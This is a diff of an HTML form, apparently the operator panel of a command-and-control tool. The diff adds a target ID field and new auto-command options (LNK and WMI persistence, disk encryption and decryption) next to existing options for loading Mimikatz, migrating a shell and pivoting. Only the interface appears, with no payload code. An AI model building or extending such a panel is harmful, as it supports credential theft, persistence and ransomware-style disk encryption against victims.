@@ -66,12 +66,17 @@
     <h2>Auto Commands :</h2>
     <br/>
     <form method="POST">
+      <label>ID :</label>
+      <input name="id2" type="text" class="form-control" placeholder="Id">
     <select class="custom-select" name="auto">
       <option value="0" selected>Open this select menu</option>
       <option value="1">Load Mimikatz</option>
       <option value="2">Migrate Shell</option>
-      <option value="3">Power Off</option>
+      <option value="3">Persistence : Lnk</option>
       <option value="4">Pivote</option>
+      <option value="5">Persistence : WMI</option>
+      <option value="6">Encrypt Disk</option>
+      <option value="7">Decrypt Disk</option>
     </select>
     <small class="form-text text-muted">By Choosing one of theses, the payload below will be lost.</small>
     <button type="submit" name="custom" class="btn btn-outline-secondary btn-lg btn-block">Send</button>
